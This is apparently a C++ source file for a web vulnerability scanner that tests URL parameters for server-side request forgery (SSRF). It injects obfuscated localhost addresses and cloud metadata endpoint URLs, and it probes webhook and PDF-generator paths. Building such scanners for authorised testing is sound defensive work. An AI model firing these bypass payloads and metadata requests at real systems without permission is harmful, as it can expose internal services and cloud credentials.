/// @file scanners/ssrf_deep.cpp
/// @brief Deep SSRF scanner: cloud metadata, redirect chains, IP format bypasses,
///        DNS rebinding indicators, webhook SSRF, PDF/image SSRF.
#include "scanner_base.hpp"
#include <regex>

namespace apex {
namespace {

/// Internal IP representations to bypass filters.
const std::vector<std::string> INTERNAL_PAYLOADS = {
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://[::ffff:127.0.0.1]",
    "http://2130706433",         // decimal 127.0.0.1
    "http://0177.0.0.1",        // octal
    "http://127.1",             // short form
    "http://0x7f000001",        // hex
    "http://0",
};

/// Cloud metadata endpoints.
const std::vector<std::pair<std::string, std::string>> METADATA_URLS = {
    {"http://169.254.169.254/latest/meta-data/", "AWS"},
    {"http://169.254.169.254/computeMetadata/v1/", "GCP"},
    {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"},
    {"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud"},
};

/// Find URL-accepting parameters in crawled URLs.
std::vector<std::pair<std::string, std::string>> find_url_params(const CrawlResult &crawl) {
  std::vector<std::pair<std::string, std::string>> targets;
  std::regex url_param_re(R"x([?&](url|uri|link|next|redirect|path|src|dest|target|return|callback|webhook|fetch|load|proxy|img|image|avatar|thumbnail|file|document|pdf|page|goto|continue|ref|data|feed|rss)=)x");

  for (const auto &url : crawl.urls) {
    std::sregex_iterator it(url.begin(), url.end(), url_param_re);
    std::sregex_iterator end;
    for (; it != end; ++it) {
      std::string param = (*it)[1].str();
      std::string base_url = url.substr(0, url.find(param + "=") + param.size() + 1);
      targets.push_back({base_url, param});
    }
  }
  return targets;
}

/// SSRF via URL parameters — test internal IPs and cloud metadata.
std::vector<Finding> scan_ssrf_internal(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
  std::vector<Finding> findings;
  auto targets = find_url_params(crawl);
  if (targets.empty()) return findings;

  for (const auto &[base_url, param] : targets) {
    // Test cloud metadata (highest impact)
    for (const auto &[meta_url, cloud] : METADATA_URLS) {
      auto resp = http.get(base_url + meta_url);
      if (resp.status_code == 200 && resp.body.size() > 20 &&
          (resp.body.find("ami-") != std::string::npos ||
           resp.body.find("instance") != std::string::npos ||
           resp.body.find("project") != std::string::npos ||
           resp.body.find("compute") != std::string::npos)) {
        findings.push_back({"SSRF — Cloud Metadata Access", "critical", base_url + meta_url,
                            "Server fetches " + cloud + " metadata endpoint. "
                            "Full cloud account compromise possible via instance credentials.",
                            param, meta_url,
                            "Response: " + resp.body.substr(0, 200)});
        return findings; // Critical — stop here
      }
    }

    // Test internal IP formats
    for (const auto &payload : INTERNAL_PAYLOADS) {
      auto resp = http.get(base_url + payload);
      if (resp.status_code == 200 && resp.body.size() > 50 &&
          resp.body.find("404") == std::string::npos &&
          resp.body.find("error") == std::string::npos &&
          resp.body.find("blocked") == std::string::npos) {
        findings.push_back({"SSRF — Internal Network Access", "high", base_url + payload,
                            "Server fetches internal URL. Attacker can scan internal services.",
                            param, payload,
                            "Got " + std::to_string(resp.body.size()) + " bytes"});
        break;
      }
    }
    if (!findings.empty()) break; // One confirmed is enough
  }
  return findings;
}

/// SSRF via redirect chain (302 → internal).
std::vector<Finding> scan_ssrf_redirect(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
  std::vector<Finding> findings;
  auto targets = find_url_params(crawl);
  if (targets.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Check if server follows redirects by pointing to our own redirect endpoint
  // that redirects to internal. We test by checking if known-safe external URL works.
  for (const auto &[base_url, param] : targets) {
    // If external URL works, the param accepts URLs
    auto resp = http.get(base_url + "https://httpbin.org/status/200");
    if (resp.status_code == 200 || resp.body.find("httpbin") != std::string::npos) {
      findings.push_back({"SSRF — Follows External URLs", "medium", base_url,
                          "Parameter '" + param + "' fetches arbitrary external URLs. "
                          "Test with redirect chain to internal for higher impact.",
                          param, "https://httpbin.org/status/200",
                          "Server successfully fetched external URL"});
      break;
    }
  }
  return findings;
}

/// SSRF via webhook/callback URLs.
std::vector<Finding> scan_ssrf_webhook(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Look for webhook configuration endpoints
  std::vector<std::string> webhook_paths = {
      "/api/webhooks", "/api/v1/webhooks", "/webhooks/configure",
      "/settings/webhooks", "/api/integrations", "/api/callbacks",
      "/admin/webhooks"};

  for (const auto &path : webhook_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 || resp.status_code == 401 || resp.status_code == 403) {
      if (resp.status_code == 200 &&
          (resp.body.find("webhook") != std::string::npos ||
           resp.body.find("callback") != std::string::npos ||
           resp.body.find("url") != std::string::npos)) {
        findings.push_back({"Webhook Endpoint Discovered", "info", base + path,
                            "Webhook configuration endpoint found. Test for SSRF via webhook URL.",
                            "", "", "Status: " + std::to_string(resp.status_code)});
        break;
      }
    }
  }
  return findings;
}

/// SSRF indicators in PDF/image generation.
std::vector<Finding> scan_ssrf_generators(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Look for PDF/image generation endpoints
  std::vector<std::string> gen_paths = {
      "/api/pdf", "/api/generate-pdf", "/api/export/pdf", "/api/screenshot",
      "/api/render", "/api/html-to-pdf", "/api/thumbnail", "/api/preview",
      "/print", "/export", "/download/pdf"};

  for (const auto &path : gen_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 || resp.status_code == 400 || resp.status_code == 405) {
      // Endpoint exists — potential SSRF via HTML/URL input
      if (resp.status_code != 404) {
        findings.push_back({"PDF/Image Generator Found", "low", base + path,
                            "Document generation endpoint found. These often accept HTML/URL input "
                            "and can be exploited for SSRF via embedded links or iframes.",
                            "", "", "Status: " + std::to_string(resp.status_code)});
        break;
      }
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_ssrf_deep_scanners() {
  return {
      {"SSRF Internal", scan_ssrf_internal},
      {"SSRF Redirect", scan_ssrf_redirect},
      {"SSRF Webhook", scan_ssrf_webhook},
      {"SSRF Generators", scan_ssrf_generators},
  };
}

} // namespace apex
